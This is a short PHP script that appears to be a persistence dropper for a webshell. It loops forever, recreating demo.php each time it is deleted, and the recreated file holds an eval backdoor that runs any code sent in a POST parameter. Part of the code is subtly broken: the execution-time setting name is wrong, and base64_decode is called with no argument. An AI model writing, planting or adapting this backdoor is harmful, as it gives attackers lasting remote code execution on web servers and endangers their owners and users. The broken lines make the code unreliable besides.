<?php
ignore_user_abort(true);
ini_set('maxdb_execution_time', 0);
while (true) {
	if(!file_exists('demo.php')){
		$a="<?php @eval("."$"."_POST"."[tese])?>";file_put_contents('demo.php',$a);
		file_put_contents('demo', base64_decode());
	}
}
?>